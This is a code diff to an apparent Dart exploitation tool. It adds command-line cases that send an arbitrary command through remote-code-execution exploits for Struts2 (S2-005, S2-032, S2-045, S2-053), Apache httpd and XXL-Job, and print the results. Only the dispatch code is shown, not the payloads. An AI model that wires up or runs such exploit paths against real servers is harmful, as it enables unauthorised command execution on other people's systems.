@@ -123,6 +123,24 @@ Future<void> main(List<String> args) async {
     case 's2053-check':
       _show(await Struts2ExpService(url: url).checkS2053());
       break;
+    case 's2005-exec':
+      print(await Struts2ExpService(url: url).execS2005(cmd));
+      break;
+    case 's2032-exec':
+      print(await Struts2ExpService(url: url).execS2032(cmd));
+      break;
+    case 's2045-exec':
+      print(await Struts2ExpService(url: url).execS2045(cmd));
+      break;
+    case 's2053-exec':
+      print(await Struts2ExpService(url: url).execS2053(cmd));
+      break;
+    case 'httpd-exec':
+      print(await ApacheHttpdExpService(baseUrl: url).execRce(cmd));
+      break;
+    case 'xxljob-exec':
+      print(await XxlJobExpService(baseUrl: url).execRce(cmd));
+      break;
     case 'spring-4977':
       _show(await SpringExpService(url: url).checkSpringSecurityOauth());
       break;
